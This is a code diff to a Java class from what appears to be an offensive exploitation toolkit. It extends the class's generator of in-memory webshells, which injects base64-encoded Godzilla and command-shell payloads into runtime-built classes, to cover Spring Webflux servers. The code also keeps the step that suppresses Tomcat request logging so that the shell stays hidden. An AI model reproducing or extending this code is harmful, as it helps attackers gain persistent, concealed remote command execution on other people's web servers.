@@ -369,7 +369,12 @@ public class Gadgets {
 		name = name.substring(name.lastIndexOf(".") + 1);
 
 		// 大多数 SpringBoot 项目使用内置 Tomcat
-		boolean isTomcat = name.startsWith("T") || name.startsWith("Spring");
+		boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
+		boolean isWebflux = name.contains("Webflux");
+
+		if (isWebflux) {
+			insertField(ctClass, "REFERER", "public String REFERER=\"" + REFERER + "\";");
+		}
 
 		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
 		String method = "";
@@ -414,7 +419,11 @@ public class Gadgets {
 			ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
 			insertTomcatNoLog(ctClass);
-			insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
+			if (isWebflux) {
+				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
+			} else {
+				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
+			}
 		} else if ("gzraw".equals(type)) {
 			insertField(ctClass, "payload", "Class payload ;");
 			insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
@@ -440,7 +449,9 @@ public class Gadgets {
 		} else {
 			insertCMD(ctClass);
 
-			if (isTomcat) {
+			if (isWebflux) {
+				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_WEBFLUX));
+			} else if (isTomcat) {
 				insertTomcatNoLog(ctClass);
 				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://su18.org/", REFERER));
 			} else {
